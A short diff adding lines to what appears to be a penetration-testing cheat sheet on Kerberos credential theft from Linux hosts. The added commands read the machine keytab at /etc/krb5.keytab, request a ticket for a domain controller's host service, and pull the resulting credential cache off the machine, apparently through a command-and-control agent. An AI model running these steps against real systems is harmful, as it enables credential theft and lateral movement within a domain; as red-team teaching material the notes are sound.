@@ -68,6 +68,10 @@ The **credential cache Kerberos blob can be converted into a usable Kerberos CCa
 git clone https://github.com/its-a-feature/KeytabParser
 python KeytabParser.py /etc/krb5.keytab
 klist -k /etc/krb5.keytab
+kinit -k -t /etc/krb5.keytab COREWEBDL\$@CORE.CYBER.LOCAL
+kvno host/coredc.core.cyber.local@CORE.CYBER.LOCAL
+download /tmp/krb5cc_uid
+
 ```
 
 ### Extract accounts from /etc/krb5.keytab
